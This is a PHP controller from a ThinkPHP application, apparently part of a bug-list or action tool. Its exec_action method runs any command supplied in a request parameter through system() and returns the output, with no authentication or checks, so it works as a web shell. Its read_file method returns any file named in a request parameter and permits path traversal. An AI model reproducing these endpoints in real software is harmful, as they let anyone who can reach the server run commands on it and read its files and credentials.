<?php
declare (strict_types = 1);

namespace app\action\controller;
use think\facade\Request;
use think\facade\View;
use app\admin\model\buglist;

class Index
{
    public function index()
    {

        return View::fetch();
    }
    public function get_all_bug(){
//        $this->dateRandom();
//        print_r('in');

        $ans=buglist::get_all();
//        var_dump($ans);
//        $ans='';
        return $ans;
    }
    public function exec_action(Request $request){
//        header('Content-Type: text/html; charset=utf-8');
//        $locale='zh_CN.UTF-8';
//        setlocale(LC_ALL,$locale);
//        putenv('LC_ALL='.$locale);
        $command=$_REQUEST["command"];
//        dump($command);
        system($command,$out);
//        return "这是一段中文";

//        dump();//读取文件内容
        return $out;

    }
    public function read_file(Request $request){
        $filename= './' . (string)$_REQUEST["txtname"];// 默认相对路径在根目录/public下
        $out=file_get_contents($filename);
        return $out;

//        fclose($myfile);
    }

}
